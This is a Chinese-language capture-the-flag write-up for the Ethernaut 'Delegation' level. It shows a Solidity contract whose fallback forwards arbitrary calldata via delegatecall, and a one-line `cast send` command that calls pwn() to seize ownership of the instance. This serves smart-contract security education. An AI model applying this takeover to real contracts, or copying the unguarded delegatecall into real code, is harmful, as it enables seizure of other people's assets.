#   Level 6 Delegation
實例地址：`0xAAA35d6dfF479448f82839eE103148a8DB5De28d`

##  題目說明
這一關的目標是取得創建實例的所有權。

  可能會有用的資訊

仔細看 solidity 文件關於 delegatecall 的低階函式。它是如何怎麽運行，如何委派操作給鏈上函式函式庫，以及它對執行時期作用範圍的影響
fallback 方法(method)
方法(method)的 ID

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

##  POC
該合約的 `fallback()` 使用 `delegatecall`，`delegatecall` 會將另一個合約儲存的內容存放至原合約相同的 `storge` 位置，利用這個原理呼叫 `Delegate` 合約的 `pwn()` 將 owner 做更換。

```bash
cast send --account=Panda 0xAAA35d6dfF479448f82839eE103148a8DB5De28d "pwn()"
```